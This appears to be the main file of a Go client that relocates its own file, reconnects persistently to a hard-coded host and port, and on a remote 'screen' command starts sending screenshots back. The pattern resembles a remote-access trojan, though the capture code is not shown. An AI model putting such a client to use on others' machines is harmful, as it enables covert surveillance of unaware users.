package main

import (
	"./serverDir"
	"./fileReg"
	"time"
)
func main(){
	//start()
	fileReg.Relocate()
	start_client()

}


var(
	specialFuncsAccess map[string]func() = make(map[string]func())
)

func start_client(){
	var cont bool = true
	for cont{
		client := serverDir.StartClient(2334, "LAPTOP-ARK617N3")
		if(client==nil){
			time.Sleep(time.Second*5)
			continue;
		}
		specialFuncsAccess["ping"] = client.Ping
		specialFuncsAccess["screen"] = client.InitiateScrenShotSendingProcess

		for !client.DC{
			content := string(client.KeepReadingLinesUntilDelim(serverDir.KNOWN_DELIM))
			if(content=="DC"){
				break;
			}
			if (content == "exit") {
				cont= false
				break;
			}
			if val, exists := specialFuncsAccess[content]; exists {
				val()
			} else {
				client.Ignore()
			}

		}
		client.Close()
	}
}


